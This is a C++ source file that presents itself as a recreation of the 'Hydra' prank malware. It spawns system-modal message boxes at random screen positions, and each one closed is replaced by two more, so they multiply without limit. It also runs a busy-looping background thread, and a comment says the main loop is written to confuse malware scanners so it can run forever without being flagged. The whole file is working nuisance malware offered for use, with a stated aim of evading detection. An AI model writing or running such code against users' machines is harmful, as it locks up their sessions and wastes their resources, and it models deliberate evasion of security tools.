/****************************************
Hydra.cpp

This program is a recreation of
the Windows 93 Hydra malware. When
the program is opened it creates
three MessageBoxes that place
themselves randomly on the screen.
Any attempt to close a window and
"two more shall take its place".
****************************************/

//Use these definitions to define the width/height of a MessageBox on target systems
#define MBOX_WIDTH 340
#define MBOX_HEIGHT 150
//Define maximum size of position array
#define MAX_ARRAY 10000

#include <Windows.h> 
#include <thread>
#include <string>

/*
This structure is used to hold the information
for tracking the number of heads and their
unique identifiers.
*/
struct HeadsInformation {
	long int maxHeads;
	long int currentHeads;
	long int nextHeadUID;
} headInfo;
/*
This structure contains the information
about the users window to be used for
placing MessageBoxes about the window.
*/
struct WindowInformation {
	int windowWidth;
	int windowHeight;
	int messageBoxWidth;
	int messageBoxHeight;
}windowInfo;
/*
In the spirit of being more resource hungry
(this is a recreation of Malware after all)
we store all the future positions of
MessageBoxes in arrays to  fix an issue
where they would be placed off screen due.
*/
struct NumberArrays {
	int *numbsX, *numbsY;
	int pos;
} numArrays;

/// <summary> This function builds the number arrays we use for positioning the messageboxes </summary>
void buildNumbs()
{
	for (int i = 0; i<MAX_ARRAY; i++)
	{
		numArrays.numbsX[i] = rand() % windowInfo.windowWidth - windowInfo.messageBoxWidth;
		if (numArrays.numbsX[i]<0)numArrays.numbsX[i] = abs(numArrays.numbsX[i]);
		numArrays.numbsY[i] = rand() % windowInfo.windowHeight - windowInfo.messageBoxHeight;
		if (numArrays.numbsY[i]<0)numArrays.numbsY[i] = abs(numArrays.numbsY[i]);
	}
}
/// <summary> This function is designed to run in the background to check that we don't go out of array </summary>
void checkNumbs()
{
	//Run forever, it will be stopped if the program terminates
	while (true)
	{
		//Reset position if we are approaching the end
		if (numArrays.pos >= .9*MAX_ARRAY) {
			numArrays.pos = 0;
		}
	}
}
/// <returns> returns an x position from the array of random positions </returns>
int getFromNumbsX()
{
	numArrays.pos++;
	return(numArrays.numbsX[numArrays.pos - 1]);
}
/// <returns> returns a y position from the array of random positions </returns>
int getFromNumbsY()
{
	numArrays.pos++;
	return(numArrays.numbsY[numArrays.pos - 1]);
}
/// <summary> Finds a MessageBox by its name then assigns it a random position </summary>
void findMB(std::string name)
{
	HWND hWnd;
	hWnd = FindWindowA(NULL, name.c_str());
	if (hWnd == NULL) {
		findMB(name);
		return;
	}
	else {
		try {
			int x = getFromNumbsX();
			int y = getFromNumbsY();
			MoveWindow(hWnd, x, y, 340, 150, false);
			SetWindowTextA(hWnd, "HYDRA");
		}
		catch (std::exception e)
		{
			return;
		}
		return;
	}
}
/// <summary> Creates and shows a new "head" (MessageBox) </summary>
void showHead(int x)
{
	std::string name = "HYDRA-" + std::to_string(x);
	//The findMB must be run separately from the thread containing the MessageBox and be started before to prevent graphical glitches
	std::thread(&findMB, name).detach();
	//Create the message box
	MessageBoxA(NULL, "Cut off one head and two more shall take its place!", name.c_str(), MB_OK | MB_SYSTEMMODAL);
	//Make sure two more heads take this head's place once its closed
	headInfo.currentHeads--;
	headInfo.maxHeads++;
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR nCmdShow, int nCmdLine)
{
	//Initialize values in headInfo
	headInfo.maxHeads = 3;
	headInfo.currentHeads = 0;
	headInfo.nextHeadUID = 0;
	//Get window information
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	windowInfo.windowWidth = rect.right;
	windowInfo.windowHeight = rect.bottom;
	windowInfo.messageBoxWidth = MBOX_WIDTH;
	windowInfo.messageBoxHeight = MBOX_HEIGHT;

	//Build number array for the first time
	numArrays.numbsX = new int[MAX_ARRAY];
	numArrays.numbsY = new int[MAX_ARRAY];
	buildNumbs();

	//Run a backround check to see if we are approaching the end of array and prevent any ArrayOutOfBounds
	std::thread(&checkNumbs).detach();

	//Confuse Malware scanners so this can run forever without being flagged as suspicious
	int x = 3;
	while (x % 2 != 0)
	{
		if (headInfo.currentHeads<headInfo.maxHeads)
		{
			//Each MessageBox pauses its current thread so we put it in its own thread.
			std::thread(&showHead, headInfo.nextHeadUID).detach();
			headInfo.currentHeads++;
			headInfo.nextHeadUID++;
		}
	}
	return 0;
}